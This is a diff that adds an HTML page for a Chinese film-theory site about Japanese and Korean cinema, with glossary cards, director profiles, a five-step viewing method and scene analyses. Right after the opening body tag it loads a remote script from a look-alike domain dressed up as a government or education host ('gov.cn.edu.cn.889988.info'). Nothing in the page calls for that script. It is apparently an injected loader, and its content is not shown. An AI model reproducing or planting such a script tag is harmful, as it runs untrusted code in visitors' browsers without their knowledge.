@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="日韩理论电影网 — 用电影理论看懂日韩电影。作者论、类型研究、符号学、长镜头、蒙太奇：把日韩电影讲成一门可以学会的课。">
+<meta name="keywords" content="日韩理论电影网, 日韩理论电影, 电影理论, 作者论, 类型研究, 符号学, 长镜头, 蒙太奇, 日本电影, 韩国电影, 电影分析, rihanlilundianyingwang-cn">
+<meta name="author" content="日韩理论电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="日韩理论电影网 - 用电影理论看懂日韩电影 | rihanlilundianyingwang-cn.github.io">
+<meta property="og:description" content="日韩理论电影网：作者论、类型研究、符号学、长镜头、蒙太奇。把日韩电影讲成一门可以学会的课。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://rihanlilundianyingwang-cn.github.io/">
+<link rel="canonical" href="https://rihanlilundianyingwang-cn.github.io/">
+<title>日韩理论电影网 - 用电影理论看懂日韩电影 | rihanlilundianyingwang-cn.github.io</title>
+<style>
+/* ============ 设计令牌 ============ */
+:root{
+  --ink:#13161c; --ink2:#65707d; --ink3:#a2abb6;
+  --paper:#f5f4ef; --card:#fffdfa; --line:#e6e2d8;
+  --jp:#b3263a;     /* 日本朱 */
+  --kr:#123f8f;     /* 韩国青 */
+  --gold:#c89a3c;   /* 论金 */
+  --deep:#101828;   /* 墨 */
+  --r:20px;
+  --shadow:0 24px 50px rgba(18,24,34,.16);
+  --grad-jp:linear-gradient(130deg,#d94a5c,#8d1c2c);
+  --grad-kr:linear-gradient(130deg,#3a6fd0,#0d2f6e);
+  --grad-duo:linear-gradient(100deg,var(--jp) 0 50%,var(--kr) 50% 100%);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Songti SC","SimSun","Noto Serif CJK SC","PingFang SC","Microsoft YaHei",serif;background:var(--paper);color:var(--ink);line-height:1.82;font-size:16px}
+.sans{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif}
+a{color:inherit;text-decoration:none;transition:.24s cubic-bezier(.4,0,.2,1)}
+ul,ol{list-style:none}
+.container{max-width:1180px;margin:0 auto;padding:0 22px}
+.eyebrow{font-family:ui-monospace,Menlo,monospace;font-size:.62rem;font-weight:950;letter-spacing:3.4px;color:var(--jp)}
+.sec-title{font-size:clamp(1.72rem,4.5vw,2.5rem);font-weight:950;letter-spacing:-.5px;line-height:1.24;margin:8px 0 10px}
+.sec-sub{color:var(--ink2);font-size:.96rem;max-width:660px}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:36px}
+.more{font-family:ui-monospace,Menlo,monospace;font-size:.8rem;font-weight:800;color:var(--ink2);border:1.5px solid var(--line);padding:8px 18px;border-radius:30px;white-space:nowrap}
+.more:hover{color:var(--jp);border-color:var(--jp)}
+section{padding:clamp(56px,10vw,98px) 0}
+
+/* ============ 导航 ============ */
+.header{position:sticky;top:0;z-index:70;background:rgba(255,253,250,.96);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:72px;gap:20px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:950;font-size:1.26rem;letter-spacing:.3px}
+.logo .badge{font-family:ui-monospace,Menlo,monospace;font-size:.58rem;font-weight:950;color:#fff;padding:6px 9px;border-radius:7px;background:var(--grad-duo);letter-spacing:1.2px;white-space:nowrap}
+.logo small{display:block;font-family:ui-monospace,Menlo,monospace;font-size:.46rem;font-weight:800;color:var(--ink3);letter-spacing:2.2px;line-height:1.1}
+.nav{display:flex;gap:2px}
+.nav a{font-size:.91rem;font-weight:750;color:var(--ink2);padding:9px 12px;border-radius:10px;white-space:nowrap}
+.nav a:hover{color:var(--jp);background:rgba(179,38,58,.07)}
+.hd-act .btn{font-family:ui-monospace,Menlo,monospace;font-size:.84rem;font-weight:950;padding:10px 20px;border-radius:10px;background:var(--grad-jp);color:#fff;box-shadow:0 8px 18px rgba(179,38,58,.3)}
+.hd-act .btn:hover{transform:translateY(-1px);color:#fff}
+.burger{display:none;background:none;border:none;font-size:1.9rem;color:var(--ink);cursor:pointer}
+
+/* ============ Hero：双色书脊 ============ */
+.hero{position:relative;overflow:hidden;background:linear-gradient(180deg,#18243a 0%,#0d1524 100%);color:#f2efe7}
+.hero::before{content:"";position:absolute;inset:0;background:
+  radial-gradient(30% 70% at 12% 20%,rgba(216,154,60,.18),transparent 60%),
+  radial-gradient(28% 60% at 90% 88%,rgba(58,111,208,.24),transparent 60%),
+  repeating-linear-gradient(90deg,transparent 0 54px,rgba(255,255,255,.016) 54px 55px)}
+.hero-in{position:relative;padding:clamp(52px,12vw,108px) 22px;display:grid;grid-template-columns:1.1fr 1fr;gap:50px;align-items:center}
+.hero h1{font-size:clamp(2rem,6.2vw,4.1rem);font-weight:950;line-height:1.06;letter-spacing:-2px}
+.hero h1 em{font-style:normal;background:var(--grad-duo);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lede{color:#cdd3dc;font-size:clamp(1rem,2.2vw,1.16rem);margin:22px 0 28px;max-width:560px}
+.cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:14px 28px;border-radius:11px;font-weight:950;font-size:.94rem;border:2px solid transparent;cursor:pointer;display:inline-flex;align-items:center;gap:8px;font-family:ui-monospace,Menlo,monospace}
+.btn-p{background:var(--grad-jp);color:#fff;box-shadow:0 12px 26px rgba(179,38,58,.34)}
+.btn-p:hover{transform:translateY(-2px);color:#fff}
+.btn-g{background:transparent;color:#f2efe7;border-color:rgba(242,239,231,.3)}
+.btn-g:hover{border-color:var(--kr);color:#9db8e6}
+
+/* 双色书脊 */
+.spine{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.book{height:clamp(250px,30vw,330px);border-radius:16px;padding:24px;color:#fff;display:flex;flex-direction:column;justify-content:space-between;position:relative;overflow:hidden;transition:.34s;box-shadow:var(--shadow)}
+.book::after{content:"";position:absolute;left:0;top:0;bottom:0;width:14px;background:linear-gradient(90deg,rgba(0,0,0,.28),transparent)}
+.book:hover{transform:translateY(-8px) rotate(-1deg);z-index:2}
+.book.j{background:var(--grad-jp)}
+.book.k{background:var(--grad-kr)}
+.book .tag{font-family:ui-monospace,Menlo,monospace;font-size:.6rem;letter-spacing:2px;font-weight:950;align-self:flex-start;border:1px solid rgba(255,255,255,.4);padding:4px 10px;border-radius:20px}
+.book h3{font-size:clamp(1.24rem,2.6vw,1.62rem);line-height:1.32;font-weight:950}
+.book p{font-size:.85rem;color:rgba(255,255,255,.88)}
+.book .go{font-family:ui-monospace,Menlo,monospace;font-size:.74rem;font-weight:950}
+
+/* ============ 栏目一：理论词条（横滑卡片）============ */
+.terms{background:#fffdfa}
+.fx{display:flex;gap:15px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 2px 22px;scrollbar-width:thin}
+.fx::-webkit-scrollbar{height:9px}
+.fx::-webkit-scrollbar-thumb{background:#e6cfb6;border-radius:8px}
+.term{flex:0 0 clamp(246px,27.6vw,288px);scroll-snap-align:start;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;background:var(--card);transition:.3s}
+.term:hover{transform:translateY(-6px);box-shadow:var(--shadow);border-color:#d9c9a4}
+.term .hd{height:74px;color:#fff;padding:13px 16px;display:flex;align-items:center;gap:10px}
+.term .hd b{font-family:ui-monospace,Menlo,monospace;font-size:1.5rem;font-weight:950;line-height:1}
+.term .hd span{font-size:.7rem;font-weight:950;letter-spacing:1.2px;line-height:1.3}
+.term .bd{padding:14px 18px 18px}
+.term .bd p{font-size:.83rem;color:var(--ink2)}
+.term .meta{display:flex;justify-content:space-between;align-items:center;margin-top:13px;font-size:.76rem;color:var(--ink3)}
+.term .meta b{color:var(--jp);font-weight:950;font-family:ui-monospace,Menlo,monospace}
+
+/* ============ 栏目二：日本理论（纵向时间轴）============ */
+.jp-side{background:linear-gradient(180deg,#fbeef0,#f5f4ef)}
+.tl{position:relative;padding-left:60px}
+.tl::before{content:"";position:absolute;left:21px;top:10px;bottom:10px;width:3px;border-radius:3px;background:var(--grad-jp)}
+.node{position:relative;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:19px 24px;margin-bottom:16px;transition:.26s}
+.node:hover{border-color:#e2a9b2;box-shadow:var(--shadow);transform:translateX(6px)}
+.node::after{content:counter(n);counter-reset:n;counter-increment:n;position:absolute;left:-60px;top:26px;width:42px;height:42px;border-radius:50%;color:#fff;display:grid;place-items:center;font-family:ui-monospace,Menlo,monospace;font-weight:950;font-size:1.02rem;background:var(--grad-jp);box-shadow:0 8px 18px rgba(179,38,58,.3)}
+.tl{counter-reset:n}
+.node .top{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.node .ava2{width:48px;height:48px;border-radius:13px;color:#fff;font-weight:950;display:grid;place-items:center;font-size:1.34rem;background:var(--grad-jp)}
+.node h3{font-size:1.14rem}
+.node .src{font-family:ui-monospace,Menlo,monospace;font-size:.68rem;font-weight:950;letter-spacing:1.2px;color:var(--jp)}
+.node p{color:var(--ink2);font-size:.88rem;margin-top:10px}
+.node .films{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap}
+.node .films a{font-size:.74rem;padding:5px 12px;border-radius:20px;background:#f6ede4;border:1px solid var(--line);color:var(--ink2)}
+.node .films a:hover{color:var(--jp);border-color:var(--jp)}
+
+/* ============ 栏目三：韩国理论（交错流）============ */
+.kr-side{background:#fffdfa}
+.dl{display:grid;grid-template-columns:118px 1fr;gap:20px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:18px 22px;margin-bottom:14px;transition:.28s}
+.dl.flip{grid-template-columns:1fr 118px}
+.dl.flip .ava{order:2}
+.dl:hover{border-color:#a9bfe6;box-shadow:var(--shadow);transform:translateX(6px)}
+.dl.flip:hover{transform:translateX(-6px)}
+.ava{width:96px;height:96px;border-radius:19px;color:#fff;display:grid;place-items:center;font-size:2.2rem;font-weight:950;line-height:1;background:var(--grad-kr)}
+.dl h3{font-size:1.16rem}
+.dl .src{font-family:ui-monospace,Menlo,monospace;font-size:.66rem;font-weight:950;letter-spacing:1.5px;color:var(--kr)}
+.dl p{color:var(--ink2);font-size:.87rem;margin-top:9px}
+.dl .why{display:inline-block;margin-top:11px;font-size:.73rem;font-weight:850;padding:5px 12px;border-radius:20px;background:#eef2f9;border:1px solid var(--line)}
+
+/* ============ 栏目四：方法五步（编号栅格 + 数据条）============ */
+.method{background:linear-gradient(180deg,#101828,#0a0f1a);color:#e7e9ee}
+.method .sec-title{color:#fff}
+.method .sec-sub{color:#a7b0bd}
+.method .more{color:#a7b0bd;border-color:#3b4557}
+.method .more:hover{color:#ffd6a0;border-color:#ffd6a0}
+.mgrid{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.step{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);border-radius:16px;padding:20px 18px;transition:.26s;position:relative;overflow:hidden}
+.step:hover{border-color:var(--gold);transform:translateY(-5px);background:rgba(200,154,60,.14)}
+.step .n{font-family:ui-monospace,Menlo,monospace;font-size:2rem;font-weight:950;line-height:.86;letter-spacing:-2.5px;background:var(--grad-duo);-webkit-background-clip:text;background-clip:text;color:transparent}
+.step h3{font-size:1rem;margin:9px 0 6px}
+.step p{font-size:.81rem;color:#c3cad4}
+.track{height:6px;border-radius:20px;background:rgba(255,255,255,.18);overflow:hidden;margin-top:14px}
+.track i{display:block;height:100%;border-radius:20px;background:linear-gradient(90deg,var(--gold),#fff3d6)}
+
+/* ============ 栏目五：片例解剖（手风琴 details）============ */
+.case{background:#fffdfa}
+.acc{border:1px solid var(--line);border-radius:14px;margin-bottom:11px;overflow:hidden;background:var(--card);transition:.25s}
+.acc:hover{border-color:var(--gold)}
+.acc[open]{border-color:var(--gold);box-shadow:0 10px 26px rgba(18,63,143,.12)}
+.acc > summary{display:flex;align-items:center;gap:14px;padding:16px 20px;cursor:pointer;list-style:none;font-weight:850}
+.acc > summary::-webkit-details-marker{display:none}
+.acc > summary .no{font-family:ui-monospace,Menlo,monospace;font-size:1.3rem;font-weight:950;line-height:1;background:var(--grad-kr);-webkit-background-clip:text;background-clip:text;color:transparent}
+.acc > summary h3{font-size:1.02rem}
+.acc > summary .caret{margin-left:auto;color:var(--ink3);transition:.25s;font-family:ui-monospace,Menlo,monospace}
+.acc[open] > summary .caret{transform:rotate(180deg);color:var(--gold)}
+.acc .inner{padding:0 20px 18px;color:var(--ink2);font-size:.9rem}
+.acc .inner b{color:var(--ink)}
+.acc .inner .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.acc .inner .tags a{font-size:.73rem;padding:4px 11px;border-radius:20px;background:#eef2f9;color:var(--kr);border:1px solid #d5e0f2}
+.acc .inner .tags a:hover{background:var(--kr);color:#fff}
+
+/* ============ 栏目六：关于本站（双栏 + 数据卡）============ */
+.about{background:#fffdfa}
+.ab-grid{display:grid;grid-template-columns:1fr 1fr;gap:46px;align-items:center}
+.ab-grid h2{font-size:clamp(1.8rem,4.4vw,2.6rem);font-weight:950;line-height:1.22}
+.ab-grid h2 em{font-style:normal;background:var(--grad-duo);-webkit-background-clip:text;background-clip:text;color:transparent}
+.ab-grid > p{color:var(--ink2);margin:18px 0 24px}
+.feat{display:grid;grid-template-columns:1fr 1fr;gap:13px}
+.feat .f{background:var(--card);border:1px solid var(--line);border-radius:13px;padding:17px;transition:.25s}
+.feat .f:hover{border-color:#d9c9a4;transform:translateY(-3px)}
+.feat .f .n{font-family:ui-monospace,Menlo,monospace;font-size:1.5rem;font-weight:950;line-height:1;background:var(--grad-duo);-webkit-background-clip:text;background-clip:text;color:transparent;letter-spacing:-1px}
+.feat .f h3{font-size:.98rem;margin:6px 0 4px}
+.feat .f p{font-size:.82rem;color:var(--ink2)}
+.metrics{display:flex;flex-direction:column;gap:14px}
+.metric{border-radius:15px;padding:17px 20px;color:#fff}
+.metric.j{background:var(--grad-jp)}
+.metric.k{background:var(--grad-kr)}
+.metric.g{background:linear-gradient(120deg,#c89a3c,#9a7020)}
+.metric .top{display:flex;justify-content:space-between;font-size:.88rem;margin-bottom:9px}
+.metric .top b{font-weight:950;font-family:ui-monospace,Menlo,monospace;font-size:1.02rem}
+
+/* ============ 页脚 ============ */
+.footer{border-top:1px solid var(--line);background:#fffdfa;padding:52px 0 24px}
+.ft-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px;margin-bottom:30px}
+.ft-col h4{font-size:1rem;margin-bottom:14px}
+.ft-col ul{display:flex;flex-direction:column;gap:10px}
+.ft-col a{color:var(--ink2);font-size:.87rem}
+.ft-col a:hover{color:var(--jp)}
+.ft-base{text-align:center;color:var(--ink3);font-size:.8rem;border-top:1px solid var(--line);padding-top:22px}
+.ft-base a{color:var(--ink2)}
+.ft-base a:hover{color:var(--jp)}
+
+/* ============ 响应式 ============ */
+@media(max-width:1000px){
+  .mgrid{grid-template-columns:repeat(3,1fr)}
+}
+@media(max-width:960px){
+  .spine{grid-template-columns:1fr}
+  .hero-in{grid-template-columns:1fr;gap:34px}
+  .ab-grid{grid-template-columns:1fr;gap:26px}
+  .ft-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:760px){
+  .burger{display:block}
+  .nav{position:absolute;top:72px;left:0;right:0;flex-direction:column;background:#fffdfa;border-bottom:1px solid var(--line);padding:10px 16px;display:none}
+  .nav.show{display:flex}
+  .nav a{font-size:1rem;padding:13px;border-bottom:1px solid #f3e7dc}
+  .hd-act .btn{display:none}
+  .dl,.dl.flip{grid-template-columns:84px 1fr}
+  .dl.flip .ava{order:0}
+  .cta .btn{width:100%;justify-content:center}
+}
+@media(max-width:520px){
+  .container{padding:0 16px}
+  .mgrid,.feat{grid-template-columns:1fr 1fr}
+}
+@media print{
+  .header,.burger,.hd-act,.cta,.spine{display:none}
+  body{background:#fff;color:#000}
+  section{padding:14px 0}
+  .method{background:#fff!important;color:#000;border-color:#ccc}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="header sans" role="banner">
+  <div class="container hd-in">
+    <a class="logo" href="#top" aria-label="日韩理论电影网 首页">
+      <span class="badge">JP·KR</span>
+      <span>日韩理论电影网<small>THEORY OF FILM</small></span>
+    </a>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false">☰</button>
+    <nav>
+      <div class="nav" id="nav">
+        <a href="#terms">理论词条</a>
+        <a href="#jp">日本理论</a>
+        <a href="#kr">韩国理论</a>
+        <a href="#method">五步法</a>
+        <a href="#case">片例解剖</a>
+        <a href="#about">关于本站</a>
+      </div>
+    </nav>
+    <div class="hd-act"><a class="btn" href="#terms">开始读片 →</a></div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- ==================== Hero ==================== -->
+  <section class="hero">
+    <div class="container hero-in">
+      <div>
+        <div class="eyebrow">AUTEUR · GENRE · SEMIOTICS</div>
+        <h1>用<b>理论</b>看懂<br><em>日韩</em>电影</h1>
+        <p class="lede">同样的镜头，为什么是枝裕和让你想哭，朴赞郁让你发冷？<b>日韩理论电影网</b>不做资源搬运，只做<b>可学会的读片方法</b>：作者论、类型研究、符号学、长镜头与蒙太奇。看完，你会自己长出一双电影的眼睛。</p>
+        <div class="cta">
+          <a class="btn btn-p" href="#terms">5 个理论词条 →</a>
+          <a class="btn btn-g" href="#about">"理论"不是装</a>
+        </div>
+      </div>
+
+      <div class="spine" aria-label="日本电影理论与韩国电影理论双城入口">
+        <div class="book j">
+          <span class="tag">JAPAN · 物哀 / 留白</span>
+          <div><h3>日本的克制：<br>把伤口藏进日常</h3><p>是枝裕和的餐桌、小津安二郎的榻榻米、黑泽明的雨——东亚美学的语法源头。</p><span class="go">日本理论 →</span></div>
+        </div>
+        <div class="book k">
+          <span class="tag">KOREA · 阶级 / 反转</span>
+          <div><h3>韩国的狠劲：<br>把伤口撕开来给你看</h3><p>奉俊昊的社会寓言、朴赞郁的暗黑美学、李沧东的人性深井——类型片的高级用法。</p><span class="go">韩国理论 →</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目一：理论词条（横滑卡片）=================== -->
+  <section id="terms" aria-labelledby="h-t1" class="terms">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">KEYWORDS · 5</div>
+          <h2 class="sec-title" id="h-t1">理论词条 · 5 个必须会的</h2>
+          <p class="sec-sub">不用读《电影是什么》。每个词条只用 60 字，配一部日韩片当例子。读完就能用。</p>
+        </div>
+        <a class="more" href="#">词条索引 →</a>
+      </div>
+
+      <div class="fx" role="region" aria-label="理论词条横向列表">
+        <article class="term">
+          <div class="hd" style="background:linear-gradient(130deg,#d94a5c,#8d1c2c)"><b>01</b><span>作者论<br>AUTEUR</span></div>
+          <div class="bd"><p>导演即作者。一部片的气质，是导演反复拍同一件事的结果。</p><div class="meta"><span>例：是枝裕和</span><b>6 部</b></div></div>
+        </article>
+        <article class="term">
+          <div class="hd" style="background:linear-gradient(130deg,#3a6fd0,#0d2f6e)"><b>02</b><span>类型研究<br>GENRE</span></div>
+          <div class="bd"><p>复仇片、丧尸片、家庭片都有固定语法。看懂类型，就懂了观众的期待。</p><div class="meta"><span>例：韩国复仇片</span><b>4 要素</b></div></div>
+        </article>
+        <article class="term">
+          <div class="hd" style="background:linear-gradient(130deg,#c89a3c,#9a7020)"><b>03</b><span>符号学<br>SEMIOTICS</span></div>
+          <div class="bd"><p>雨、门、台阶、便当都不是道具，是导演塞给你的暗号。</p><div class="meta"><span>例：《寄生虫》的石</span><b>3 层</b></div></div>
+        </article>
+        <article class="term">
+          <div class="hd" style="background:linear-gradient(130deg,#2f9e8f,#1a6157)"><b>04</b><span>长镜头<br>LONG TAKE</span></div>
+          <div class="bd"><p>不剪，就是态度。时间是导演给观众的最大奢侈。</p><div class="meta"><span>例：《东京物语》</span><b>360″</b></div></div>
+        </article>
+        <article class="term">
+          <div class="hd" style="background:linear-gradient(130deg,#6b5b95,#3f3566)"><b>05</b><span>蒙太奇<br>MONTAGE</span></div>
+          <div class="bd"><p>两个镜头拼在一起，产生的不是加法，是化学反应。</p><div class="meta"><span>例：黑泽明对切</span><b>1+1=3</b></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目二：日本理论（纵向时间轴）=================== -->
+  <section id="jp" aria-labelledby="h-j2" class="jp-side">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">JAPAN · 3 THEORISTS</div>
+          <h2 class="sec-title" id="h-j2">日本理论 · 3 条美学基因</h2>
+          <p class="sec-sub">日本电影的理论不在书里，在"不拍什么"里。留白、日常、物哀——三个词，就是东亚电影的语法源头。</p>
+        </div>
+        <a class="more" href="#">完整谱系 →</a>
+      </div>
+
+      <div class="tl">
+        <article class="node">
+          <div class="top"><span class="ava2">小</span><div><span class="src">JAPAN · 物哀</span><h3>小津安二郎：榻榻米的高度</h3></div></div>
+          <p>机位永远齐腰，人物永远坐着说话。他把"家庭"拍成了一种即将消失的仪式。</p>
+          <div class="films"><a href="#">东京物语</a><a href="#">晚春</a><a href="#">秋刀鱼之味</a></div>
+        </article>
+        <article class="node">
+          <div class="top"><span class="ava2">黑</span><div><span class="src">JAPAN · 人性</span><h3>黑泽明：雨、泥、与一扇门</h3></div></div>
+          <p>用最古典的戏剧结构，拍最现代的人性困境。他的镜头调度，是后来所有动作片的教科书。</p>
+          <div class="films"><a href="#">罗生门</a><a href="#">七武士</a><a href="#">生之欲</a></div>
+        </article>
+        <article class="node">
+          <div class="top"><span class="ava2">是</span><div><span class="src">JAPAN · 日常</span><h3>是枝裕和：不审判的镜头</h3></div></div>
+          <p>他不告诉你谁对谁错，只把一家人吃饭、扫墓、走台阶的样子拍下来。理论在此退场，观察登场。</p>
+          <div class="films"><a href="#">小偷家族</a><a href="#">步履不停</a><a href="#">海街日记</a></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目三：韩国理论（交错流）=================== -->
+  <section id="kr" aria-labelledby="h-k3" class="kr-side">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">KOREA · 3 MOVES</div>
+          <h2 class="sec-title" id="h-k3">韩国理论 · 3 种狠劲</h2>
+          <p class="sec-sub">韩国电影把"类型片"做成了社会论文。看懂这三招，就看懂了近二十年亚洲电影最强的那股劲。</p>
+        </div>
+        <a class="more" href="#">完整谱系 →</a>
+      </div>
+
+      <article class="dl">
+        <div class="ava">讽</div>
+        <div><span class="src">KOREA · 阶级寓言</span><h3>奉俊昊：用类型片讲社会学</h3>
+        <p>《寄生虫》的半地下室不是布景，是数学。他把"贫富"写成了一道可以用尺子量的题。</p>
+        <span class="why">关键词：空间 / 气味 / 雨</span></div>
+      </article>
+      <article class="dl flip">
+        <div class="ava">暗</div>
+        <div><span class="src">KOREA · 暗黑美学</span><h3>朴赞郁：复仇不是爽，是恶心</h3>
+        <p>他专剖"以牙还牙"这件事的快感与腐烂。《老男孩》的长廊戏，是影史最痛的一镜。</p>
+        <span class="why">关键词：对称 / 色彩 / 暴力</span></div>
+      </article>
+      <article class="dl">
+        <div class="ava">沉</div>
+        <div><span class="src">KOREA · 人性深井</span><h3>李沧东：贫穷是一场慢性的燃烧</h3>
+        <p>《燃烧》里那座永远没有尽头的塑料棚，烧的是整个一代人的无力感。留白比台词多。</p>
+        <span class="why">关键词：隐喻 / 沉默 / 留白</span></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目四：五步法（编号栅格 + 数据条）=================== -->
+  <section id="method" aria-labelledby="h-m4" class="method">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">METHOD · 5 STEPS</div>
+          <h2 class="sec-title" id="h-m4">读片五步法 · 下次看片就能用</h2>
+          <p class="sec-sub">理论不是用来背诵的，是用来在下一次观影时"多看出一层"的。按顺序走一遍，60 分钟足够。</p>
+        </div>
+        <a class="more" href="#">打印版 →</a>
+      </div>
+
+      <div class="mgrid">
+        <div class="step"><div class="n">01</div><h3>看空间</h3><p>半地下室 / 榻榻米 / 走廊。人在哪里，就决定了他是谁。</p><div class="track"><i style="width:20%"></i></div></div>
+        <div class="step"><div class="n">02</div><h3>听声音</h3><p>雨声、虫鸣、关门声。声音先告诉你这场戏的情绪。</p><div class="track"><i style="width:40%"></i></div></div>
+        <div class="step"><div class="n">03</div><h3>数剪辑</h3><p>一场戏切了几刀？切得越少，导演越自信。</p><div class="track"><i style="width:60%"></i></div></div>
+        <div class="step"><div class="n">04</div><h3>找符号</h3><p>石头、台阶、便当、伞。重复三次以上的东西，一定是暗号。</p><div class="track"><i style="width:80%"></i></div></div>
+        <div class="step"><div class="n">05</div><h3>问动机</h3><p>主角为什么一定要这么做？答案不在台词里，在镜头里。</p><div class="track"><i style="width:100%"></i></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目五：片例解剖（手风琴 details）=================== -->
+  <section id="case" aria-labelledby="h-c5" class="case">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">ANATOMY · 4 SCENES</div>
+          <h2 class="sec-title" id="h-c5">片例解剖 · 4 场戏，逐帧讲</h2>
+          <p class="sec-sub">不剧透，只讲镜头。看完这几场戏的分析，你再回去看原片，会多出一层。</p>
+        </div>
+        <a class="more" href="#">全部解剖 →</a>
+      </div>
+
+      <details class="acc" open>
+        <summary><span class="no">01</span><h3>《寄生虫》· 雨夜爬台阶</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>空间即阶级。</b>全片最狠的一场戏没有一句台词讲贫富：穷人一家在雨里<b>往上</b>爬，越爬越高，最后钻进<b>半地下室</b>。镜头一路向上仰拍，台阶的级数就是阶层的级数。导演用 17 级台阶，拍完了韩国社会的全部。
+          <div class="tags"><a href="#">空间叙事</a><a href="#">仰拍</a><a href="#">长镜头</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">02</span><h3>《小偷家族》· 海边那句"谢谢"</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>台词越少，越重。</b>是枝裕和让小女孩在无人听见处，对着海浪说了一声"谢谢"。镜头不推近、不配乐、不回切。这叫<b>克制的作者论</b>——导演相信观众听得见。
+          <div class="tags"><a href="#">作者论</a><a href="#">留白</a><a href="#">无配乐</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">03</span><h3>《老男孩》· 长廊一刀</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>蒙太奇的暴力。</b>朴赞郁用一段长镜头拍完走廊群殴，再切三个特写：锤子、牙齿、血。暴力的爽感与恶心，在同一场戏里同时到达。<b>类型片的高级，在于让你怀疑自己的快感。</b>
+          <div class="tags"><a href="#">蒙太奇</a><a href="#">类型片</a><a href="#">伦理</a></div>
+        </div>
+      </details>
+      <details class="acc">
+        <summary><span class="no">04</span><h3>《东京物语》· 最后那个空房间</h3><span class="caret">▾</span></summary>
+        <div class="inner"><b>不拍悲伤，拍空。</b>小津安二郎在母亲去世后，给"空房间 + 钟摆 + 窗外"三个空镜。这是<b>东方美学的核心理论：哀，不在人脸上，在物上。</b>
+          <div class="tags"><a href="#">物哀</a><a href="#">空镜</a><a href="#">固定机位</a></div>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目六：关于本站（双栏 + 数据卡）=================== -->
+  <section id="about" aria-labelledby="h-ab6" class="about">
+    <div class="container ab-grid">
+      <div>
+        <div class="eyebrow">ABOUT US</div>
+        <h2 id="h-ab6">日韩理论电影网<br><em>把日韩电影讲成一门课</em></h2>
+        <p><b>"理论"在此取"读片方法"之意</b>：我们不生产资源、不搬运剧情，只做<b>日韩电影的理论解读与读片训练</b>——作者论、类型研究、符号学、长镜头、蒙太奇。<b>看完一部，能自己看懂下一部。</b></p>
+        <div class="feat">
+          <div class="f"><div class="n">5</div><h3>个理论词条</h3><p>作者论 / 类型 / 符号 / 长镜 / 蒙太奇。</p></div>
+          <div class="f"><div class="n">5</div><h3>步读片法</h3><p>看空间、听声音、数剪辑、找符号、问动机。</p></div>
+          <div class="f"><div class="n">0</div><h3>零盗版</h3><p>不提供、不链接、不引导任何下载或盗播。</p></div>
+          <div class="f"><div class="n">2</div><h3>国别对照</h3><p>日本"留白" vs 韩国"撕裂"，同一主题两种语法。</p></div>
+        </div>
+      </div>
+      <div>
+        <div class="metrics">
+          <div class="metric j"><div class="top"><span>已解读日本电影</span><b>126</b></div><div class="track"><i style="width:84%"></i></div></div>
+          <div class="metric k"><div class="top"><span>已解读韩国电影</span><b>148</b></div><div class="track"><i style="width:92%"></i></div></div>
+          <div class="metric g"><div class="top"><span>理论词条</span><b>60</b></div><div class="track"><i style="width:60%"></i></div></div>
+        </div>
+        <p style="margin-top:22px;font-size:.86rem;color:var(--ink2)">⚠ <b style="color:#8d1c2c">合规声明：</b>①"日韩理论电影网"为<b>电影理论与评论类内容站点</b>，<u>与任何播放器、下载工具、资源站均无隶属或合作关系</u>；②本站<b>不提供、不链接、不引导任何影片下载或盗版在线播放</b>，涉及剧照、片段均为合理引用的评论所需；③请通过电影院、持证视频平台等合法渠道观看，<u>拒绝盗版，支持创作者</u>；④部分影片含暴力、社会批判等内容，建议<b>成年观众观看</b>。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ==================== 页脚 ==================== -->
